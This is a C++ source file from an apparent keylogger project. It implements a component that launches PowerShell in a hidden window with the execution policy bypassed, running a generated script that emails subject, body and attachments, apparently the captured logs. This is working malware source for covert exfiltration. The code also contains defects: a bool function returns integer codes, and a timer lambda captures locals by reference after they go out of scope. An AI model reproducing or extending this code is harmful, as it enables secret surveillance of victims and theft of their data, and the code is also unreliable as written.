#include "PowerShellMailSender.h"

namespace keylogger::mail
{
namespace
{
std::string stringReplace(std::string s, const std::string& stringToReplace, const std::string& replaceWith);
}

PowerShellMailSender::PowerShellMailSender(std::unique_ptr<PowerShellSendMailScriptCreator> scriptCreatorInit)
    : scriptCreator{std::move(scriptCreatorInit)}
{
}

bool PowerShellMailSender::sendMail(const Mail& mail, const Credentials& credentials)
{
    std::string attachmentsAsString;

    //    if (mail.attachments.size() == 1)
    //    {
    //        attachmentsAsString = mail.attachments.at(0);
    //    }
    //    else
    //    {
    //        for (const auto& attachment : mail.attachments)
    //        {
    //            attachmentsAsString += attachment + "::";
    //        }
    //
    //        attachmentsAsString = attachmentsAsString.substr(0, attachmentsAsString.length() - 2);
    //    }

    if (auto begin = mail.attachments.begin(); begin != mail.attachments.end())
    {
        attachmentsAsString = *begin;
        for (auto attachmentIter = std::next(begin); attachmentIter != mail.attachments.end();
             ++attachmentIter)
        {
            attachmentsAsString += "::" + *attachmentIter;
        }
    }

    const bool scriptExists = scriptCreator->createScript(mail, credentials);
    if (!scriptExists)
    {
        return false;
    }

    std::string parameters = "-ExecutionPolicy ByPass -File \"" + scriptCreator->getScriptFilePath() +
                             "\" -Subj \"" + stringReplace(mail.subject, "\"", "\\\"") + "\" -Body \"" +
                             stringReplace(mail.body, "\"", "\\\"") + "\" -Att \"" + attachmentsAsString +
                             "\"";

    SHELLEXECUTEINFO shellExecuteInfo = {0};
    shellExecuteInfo.cbSize = sizeof(SHELLEXECUTEINFO);
    shellExecuteInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shellExecuteInfo.hwnd = NULL;
    shellExecuteInfo.lpVerb = "open";
    shellExecuteInfo.lpFile = "powershell";
    shellExecuteInfo.lpParameters = parameters.c_str();
    shellExecuteInfo.lpDirectory = NULL;
    shellExecuteInfo.nShow = SW_HIDE;
    shellExecuteInfo.hInstApp = NULL;

    bool executionStatus = static_cast<bool>(ShellExecuteEx(&shellExecuteInfo));
    if (!executionStatus)
    {
        return -3;
    }

    WaitForSingleObject(shellExecuteInfo.hProcess, 7000);
    DWORD exitCode = 100;
    GetExitCodeProcess(shellExecuteInfo.hProcess, &exitCode);

    timer.setTimerCallback([&]() {
        WaitForSingleObject(shellExecuteInfo.hProcess, 60000);
        GetExitCodeProcess(shellExecuteInfo.hProcess, &exitCode);
        if ((int)exitCode == STILL_ACTIVE)
        {
            TerminateProcess(shellExecuteInfo.hProcess, 100);
        }
        utils::appendLog("<From MailSender> Return code " + std::to_string((int)exitCode));
    });

    timer.setTotalNumberOfCalls(1L);
    timer.setInterval(10L);
    timer.start(true);

    utils::appendLog("STATUS CODE: " + std::to_string((int)exitCode));
    return static_cast<int>(exitCode);
}

namespace
{
std::string stringReplace(std::string s, const std::string& stringToReplace, const std::string& replaceWith)
{
    if (stringToReplace.empty())
    {
        return s;
    }

    size_t position = 0;

    while ((position = s.find(stringToReplace, position)) != std::string::npos)
    {
        s.replace(position, stringToReplace.length(), replaceWith);
        position += replaceWith.length();
    }

    return s;
}
}
}